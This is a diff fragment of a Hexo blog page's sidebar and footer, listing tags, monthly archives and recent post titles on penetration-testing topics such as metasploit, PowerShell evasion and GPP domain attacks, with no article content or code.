+      <a href="/tags/GPP/" style="font-size: 10px;">GPP</a> <a href="/tags/http代理/" style="font-size: 10px;">http代理</a> <a href="/tags/mestasploit/" style="font-size: 10px;">mestasploit</a> <a href="/tags/漏洞分析/" style="font-size: 20px;">漏洞分析</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/03/24/跨域方案枚举/">跨域方案枚举</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/24/免杀Powershell/">免杀Powershell</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/11/metasploit自动化攻击/">metasploit自动化攻击</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/08/VBScript挂马/">VBScript挂马</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/04/使用GPP漏洞进行域渗透/">使用GPP漏洞进行域渗透</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
